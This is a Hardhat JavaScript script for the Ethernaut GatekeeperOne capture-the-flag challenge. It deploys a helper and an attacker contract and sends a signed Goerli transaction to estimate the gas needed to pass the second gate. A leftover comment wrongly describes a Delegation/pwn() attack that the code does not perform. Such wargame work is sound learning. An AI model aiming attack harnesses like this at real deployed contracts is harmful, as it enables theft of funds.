/*
This script will be used to test & validate the algorithm to calculate the required gass to pass the gate two
Once the algorithm is validated, such an algorithm must be executed against the GateKeeperOne contract (The one deployed by Ethernaut!)
*/

const hre = require("hardhat");
const path = require("path");
require('dotenv').config( {
  path: path.join(__dirname, '.env')
} );

PRIVATE_KEY=process.env.PRIVATE_KEY;

async function main() {
  // Recreating the attack on ganache
  [player] = await ethers.getSigners();

  // Deploying the CalculateGas contract
  const CalculateGas = await hre.ethers.getContractFactory("CalculateGas");
  this.calculateGas = await CalculateGas.connect(player).deploy();
  await this.calculateGas.deployed();

  // Deploying the GatekeeperOneAttacker contract
  const GatekeeperOneAttacker = await hre.ethers.getContractFactory("GatekeeperOneAttacker");
  this.gateKeeperOneAttacker = await GatekeeperOneAttacker.connect(player).deploy(this.calculateGas.address);
  await this.gateKeeperOneAttacker.deployed();

  // Getting the bytes4 signature of a function
  // Source -> https://ethereum.stackexchange.com/questions/83165/is-there-a-way-to-get-the-result-of-web3s-encodefunctioncall-with-ethers //
  let delegateABI = ["function estimateGasForGateTwo()"];
  let iface = new hre.ethers.utils.Interface(delegateABI); 
  const selectorHash = iface.encodeFunctionData("estimateGasForGateTwo")

  console.log("\n\n Performing attack ... \n");

  // Signing and Sending the tx
  const playerWallet = new hre.ethers.Wallet(PRIVATE_KEY);

  gasPrice = await hre.ethers.provider.getGasPrice()
  nonce = await hre.ethers.provider.getTransactionCount(playerWallet.address);

  let tx = {
    chainId: 5, // for goerli
    nonce: nonce,
    to: this.gateKeeperOneAttacker.address,
    value: 0,
    gasLimit: 6721975,
    gasPrice: gasPrice,
    // msg.data contains the function signare of pwn(), bcs such a function doesn't exists on the Delegation contract, it will be handled by the fallback() and from there it will be executed a delegateCall() to the Delegate contract forwarding the msg.data
    // The Delegate contract will recognize the function signature encoded in the msg.data, and will call the pwn(), thus, setting the owner to be the msg.sender, which is the account that called the Delegation contract (bcs the delegateCall())!
    data: selectorHash 
  };

  let signedTx = await playerWallet.signTransaction(tx);
  console.log("signedTx: ", signedTx);
  let sentTx = await hre.ethers.provider.sendTransaction(signedTx);
  console.log("sentTx: ",sentTx);
  
  let txResult = await hre.ethers.provider.waitForTransaction(sentTx.hash);
  console.log("Transaction sent! - Getting required gas");
  console.log("Transaction Result: ", txResult);

  console.log("\n===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n");

  console.log(
    `
    found number?: ${await this.gateKeeperOneAttacker.foundNumber()} \n
    required gas: ${await this.gateKeeperOneAttacker.requiredGas()}
    `
  );

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});